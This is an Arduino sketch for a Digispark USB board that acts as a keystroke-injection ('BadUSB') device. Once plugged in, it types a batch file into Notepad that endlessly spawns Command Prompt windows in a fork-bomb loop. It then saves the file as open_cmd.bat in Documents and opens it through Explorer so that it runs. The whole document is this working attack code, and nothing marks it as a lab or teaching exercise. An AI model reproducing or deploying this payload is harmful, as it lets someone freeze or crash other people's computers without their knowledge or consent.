#include "DigiKeyboard.h"

void setup() {

  pinMode(1, OUTPUT);

  DigiKeyboard.delay(500); 

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //Win + R
  DigiKeyboard.delay(500);
  DigiKeyboard.print("notepad"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(1000); 

  DigiKeyboard.print("@echo off");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("echo Opening Command Prompt...");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(":loop");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("start cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("goto loop"); 
  
  DigiKeyboard.delay(500);


  DigiKeyboard.sendKeyStroke(KEY_S, MOD_CONTROL_LEFT); 
  DigiKeyboard.delay(500);

  DigiKeyboard.print("open_cmd.bat"); 
  delay(500);

   for (int i = 0; i < 7; i++) {
     DigiKeyboard.sendKeyStroke(0x2B);
     DigiKeyboard.delay(300); 
   }
   delay(500);

   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   delay(500);

   DigiKeyboard.print("Documents");

  DigiKeyboard.sendKeyStroke(KEY_ENTER); 

  delay(500);

     for (int i = 0; i < 10; i++) {
     DigiKeyboard.sendKeyStroke(0x2B);
     DigiKeyboard.delay(300); 
   }

 delay(500);

  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  
  DigiKeyboard.delay(500); 

  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);

  //----------------------------------------------------------------------------- opening the created .bat file

  DigiKeyboard.sendKeyStroke(KEY_E, MOD_GUI_LEFT); // Windows + E
  DigiKeyboard.delay(1000);

 for (int i = 0; i < 6; i++) {
     DigiKeyboard.sendKeyStroke(0x2B); // TAB
     DigiKeyboard.delay(300); 
   }
  DigiKeyboard.delay(500);

  DigiKeyboard.print("Documents"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(500);

  DigiKeyboard.print("open_cmd.bat"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

}


void loop() {
  
  digitalWrite(1, HIGH);
  delay(100);
  digitalWrite(1, LOW);
  delay(1000);

}
